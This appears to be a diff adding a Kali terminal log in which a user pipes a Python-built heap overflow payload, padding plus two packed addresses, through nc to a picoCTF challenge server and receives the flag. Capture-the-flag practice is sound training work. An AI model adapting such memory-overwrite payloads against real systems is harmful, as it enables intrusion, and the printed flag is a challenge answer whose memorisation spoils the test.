@@ -1,0 +1,10 @@
+
+┌──(santey22㉿santey22)-[~]
+└─$ python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*8 + b"B"*8 + b"C"*4 + struct.pack("<I",0x0804c040) + struct.pack("<I",0x080492b6) + b" Z\n")' | nc foggy-cliff.picoctf.net 55953
+Enter two names separated by space:
+Enter two names separated by space:
+FLAG: picoCTF{h34p_0v3rfl0w_b59f3184}
+No winners this time, try again!
+
+┌──(santey22㉿santey22)-[~]
+└─$
